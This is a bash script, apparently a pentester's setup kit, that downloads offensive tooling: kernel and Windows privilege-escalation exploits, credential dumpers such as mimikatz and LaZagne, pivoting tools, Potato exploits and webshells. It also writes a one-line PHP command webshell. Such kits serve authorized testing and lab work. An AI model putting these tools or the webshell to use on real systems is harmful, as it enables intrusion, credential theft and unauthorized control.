#! /bin/bash

# Made by RogueSec
# hello@roguesec.net
# https://github.com/R0gueSec
# Discord: @roguesec

mkdir TransferTools
cd TransferTools
mkdir Cats
cd Cats
mkdir Linux
cd Linux
wget https://github.com/H74N/netcat-binaries/raw/master/nc
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
git clone https://github.com/robiot/rustcat.git
wget https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-linux-x86_64
cd ..
mkdir Windows
cd Windows
cp /usr/share/windows-resources/binaries/nc.exe .
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/ncat.exe
wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe
wget https://github.com/StudioEtrange/socat-windows/raw/master/socat.exe
wget http://www.dest-unreach.org/socat/download/socat-1.8.0.0.tar.gz
tar -xf socat-1.8.0.0.tar.gz
rm socat-1.8.0.0.tar.gz
git clone https://github.com/besimorhino/powercat.git
cd ..
cd ..
mkdir Client-SideAttacks
cd Client-SideAttacks
git clone https://github.com/0bfxgh0st/MMG-LO/tree/main
git clone https://github.com/Greenwolf/ntlm_theft
git clone https://github.com/xct/hashgrab
cd ..
mkdir PortScanners-NmapClones
cd PortScanners-NmapClones
git clone https://github.com/sdcampbell/goscan.git
cd goscan
sudo apt install gccgo-go       
sudo apt install golang-go 
CGO_ENABLED=0 go build goscan.go
GOOS=windows go build -o goscan.exe goscan.go
cd ..
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
wget https://raw.githubusercontent.com/samratashok/nishang/master/Scan/Invoke-PortScan.ps1
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/nmap.exe
cd ..
mkdir Exploits
cd Exploits
mkdir Linux
cd Linux
git clone https://github.com/dirtycow/dirtycow.github.io.git
git clone https://github.com/blasty/CVE-2021-3156.git
git clone https://github.com/arthepsy/CVE-2021-4034.git
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
git clone https://github.com/Liuk3r/CVE-2023-32233.git
git clone https://github.com/spencerdodd/kernelpop.git
cd ..
mkdir Windows
cd Windows
wget https://github.com/GossiTheDog/HiveNightmare/releases/download/0.6/HiveNightmare.exe
git clone https://github.com/cube0x0/CVE-2021-1675.git
git clone https://github.com/calebstewart/CVE-2021-1675.git
git clone https://github.com/RedCursorSecurityConsulting/CVE-2020-0668.git
wget https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059%3A%20Chimichurri/Compiled/Chimichurri.exe
wget https://github.com/egre55/windows-kernel-exploits/blob/master/MS09-012%3A%20Churrasco/Compiled/Churrasco.exe
wget https://github.com/egre55/windows-kernel-exploits/blob/master/CVE-2017-0213%3A%20COM%20Aggregate%20Marshaler/Compiled/CVE-2017-0213.exe
cd ..
cd ..
mkdir Explorer++
cd Explorer++
wget https://download.explorerplusplus.com/dev/latest/explorerpp_x86.zip
wget https://download.explorerplusplus.com/dev/latest/explorerpp_x64.zip
cd ..
mkdir FileTransfer
cd FileTransfer
wget https://gist.githubusercontent.com/HarmJ0y/bb48307ffa663256e239/raw/f1e0d1877d1b9dd6b3fc8bae18ff6cec6ea6eaa8/DownloadCradles.ps1
wget https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1
git clone https://github.com/danielbohannon/Invoke-CradleCrafter.git
cd ..
mkdir PasswordDumpers
cd PasswordDumpers
mkdir Linux
cd Linux
git clone https://github.com/huntergregal/mimipenguin.git
git clone https://github.com/unode/firefox_decrypt.git
cd ..
mkdir Windows
cd Windows
wget https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe
git clone https://github.com/dafthack/MailSniper.git
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
chmod +x mimikatz_trunk.zip
unzip mimikatz_trunk.zip -d ./mimikatz_trunk
git clone https://github.com/Arvanaghi/SessionGopher.git
git clone https://github.com/GhostPack/SharpDPAPI.git
wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.140/Snaffler.exe
wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe
mkdir Mimikatz
cd Mimikatz
mkdir Win32
cd Win32
cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe .
cd ..
mkdir x64
cd x64
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
cd ..
cd ..
cd ..
cd ..
mkdir Pivoting
cd Pivoting
git clone https://github.com/nicocha30/ligolo-ng.git
cd ligolo-ng
go build -o proxy cmd/proxy/main.go
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
chmod +x ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
chmod +x ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
mkdir Linux
tar -xvzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz -C ./Linux
tar -xvzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz -C ./Linux
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip
chmod +x ligolo-ng_agent_0.8.2_windows_amd64.zip
mkdir Windows
unzip ligolo-ng_agent_0.8.2_windows_amd64.zip -d ./Windows
cd ..
mkdir Windows
cd Windows
wget https://github.com/StudioEtrange/socat-windows/raw/master/socat.exe
mkdir Chisel
cd Chisel
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_386.gz
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz
cd ..
wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x86.zip
git clone https://github.com/lukebaggett/dnscat2-powershell.git
cd ..
mkdir Linux
cd Linux
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_386.gz
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
cd ..
cd ..
mkdir Potatoes
cd Potatoes
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
wget https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe
wget https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/GetCLSID.ps1
wget https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip
unzip JuicyPotatoNG.zip
rm JuicyPotatoNG.zip
wget https://raw.githubusercontent.com/antonioCoco/JuicyPotatoNG/main/test_system_ports.ps1
wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip
unzip RoguePotato.zip
rm RoguePotato.zip
git clone https://github.com/CCob/SweetPotato.git
wget https://github.com/jas502n/SweetPotato-webshell/releases/download/1.0/SweetPotatox86.exe
wget https://github.com/jas502n/SweetPotato-webshell/releases/download/1.0/SweetPotatox64.exe
git clone https://github.com/Kevin-Robertson/Tater.git
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
git clone https://github.com/itm4n/PrintSpoofer.git
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
cd ..
mkdir PrivEscCheckers
cd PrivEscCheckers
git clone https://github.com/peass-ng/PEASS-ng.git
cd PEASS-ng
cd winPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/download/20231217-4a3b3f9d/winPEAS.bat
wget https://github.com/carlospolop/PEASS-ng/releases/download/20231217-4a3b3f9d/winPEASany.exe
wget https://github.com/carlospolop/PEASS-ng/releases/download/20231217-4a3b3f9d/winPEASany_ofs.exe
wget https://github.com/carlospolop/PEASS-ng/releases/download/20231217-4a3b3f9d/winPEASx64.exe
wget https://github.com/carlospolop/PEASS-ng/releases/download/20231217-4a3b3f9d/winPEASx64_ofs.exe
wget https://github.com/carlospolop/PEASS-ng/releases/download/20231217-4a3b3f9d/winPEASx86.exe
wget https://github.com/carlospolop/PEASS-ng/releases/download/20231217-4a3b3f9d/winPEASx86_ofs.exe
cd ..
cd linPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/download/20231217-4a3b3f9d/linpeas.sh
wget https://github.com/carlospolop/PEASS-ng/releases/download/20231217-4a3b3f9d/linpeas_fat.sh
wget https://github.com/carlospolop/PEASS-ng/releases/download/20231217-4a3b3f9d/linpeas_linux_386
wget https://github.com/carlospolop/PEASS-ng/releases/download/20231217-4a3b3f9d/linpeas_linux_amd64
cd ..
cd ..
mkdir Linux
cd Linux
git clone https://github.com/rebootuser/LinEnum.git
git clone https://github.com/The-Z-Labs/linux-exploit-suggester.git
git clone https://github.com/diego-treitos/linux-smart-enumeration.git
cd ..
mkdir Windows
cd Windows
git clone https://github.com/411Hall/JAWS.git
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git
git clone https://github.com/Arvanaghi/SessionGopher.git
git clone https://github.com/bitsadmin/wesng.git
cd ..
cd ..
mkdir ProcessMonitoring
cd ProcessMonitoring
wget https://download.sysinternals.com/files/ProcessMonitor.zip
chmod +x ProcessMonitor.zip
unzip ProcessMonitor.zip -d ./ProcessMonitor
mkdir pspy
cd pspy
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
mkdir small
cd small
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32s
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s
cd ..
cd ..
cd ..
wget https://download.sysinternals.com/files/PSTools.zip
chmod +x PSTools.zip
unzip PSTools.zip -d ./PSTools
mv PSTools.zip ./PSTools
mkdir Shells
cd Shells
cp -r /usr/share/webshells/ .
echo '<?php system($_REQUEST['cmd']); ?>' > shell.php
wget https://raw.githubusercontent.com/Arrexel/phpbash/refs/heads/master/phpbash.php
wget https://raw.githubusercontent.com/xl7dev/WebShell/refs/heads/master/Aspx/Antak%20Webshell.aspx
https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/refs/heads/master/webshell.php
wget https://github.com/R0gueSec/ToolsDownloaders/releases/download/PDF/StabilizingShellwithPython.pdf
git clone https://github.com/infodox/python-pty-shells.git
wget https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb
sudo dpkg -i rustscan_2.0.1_amd64.deb
wget https://raw.githubusercontent.com/Alamot/code-snippets/refs/heads/master/winrm/winrm_shell_with_upload.rb
cd ..
mkdir UserElevate
cd UserElevate
wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
unzip RunasCs.zip
wget https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe
wget https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1
git clone https://github.com/ScriptKiddieTutorials/Bypass-UAC.git
cd ..
mkdir Wordlists
cd Wordlists
git clone https://github.com/insidetrust/statistically-likely-usernames.git
cd ..

